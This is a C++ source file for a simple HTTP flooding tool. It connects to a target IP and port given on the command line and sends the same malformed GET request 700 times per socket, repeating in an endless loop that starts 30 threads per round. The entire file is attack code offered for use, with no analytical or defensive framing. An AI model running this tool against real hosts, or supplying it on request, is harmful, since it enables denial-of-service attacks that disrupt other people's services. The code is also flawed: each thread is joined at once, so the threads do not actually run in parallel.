#include <iostream>
#include <cstring>
#include <thread>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
using namespace std;

// Variables
int socketIter = 700;
const char *getReq = "GET / HTTP 1.1  42069 \r\n";
int threadCount = 30;

// Socket
int socketOps(const char *target,int port){
	// Logging info
	cout << "Target: " << target << ":" << port << "\n";
	// Creation
	struct sockaddr_in host;
	int s,conn,flow;
	inet_pton(AF_INET,target,&host.sin_addr);
	host.sin_family = AF_INET;
	host.sin_port = htons(port);
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0){
		cout << "[!] Socket failed to be created \n Exiting... \n";
		exit(1);
	}
	else{
		cout << "[*] Socket has been created \n";
	};

	// Connection
	conn = (connect(s,(struct sockaddr *)&host,sizeof(host)));
	if(conn < 0) {
		cout << "[!] Connection failed\n";		
	}
	else{
		cout << "[*] Socket connected to host\n";
	}
	
	// Sending data
	for(int i = 0; i<socketIter; i++){
		flow = send (s,getReq,strlen(getReq),0);	
		cout << "[*] Request sent\n";
	};
	return 0;
};

// MAIN
int main(int argc, char *argv[]){
	// Threading
	while (true) {
		for (int i = 0; i<threadCount; i++){
			thread t(socketOps, argv[1],atoi(argv[2]));
			t.join();
		};
	};
	//socketOps(argv[1],atoi(argv[2]));
	return 0;
}
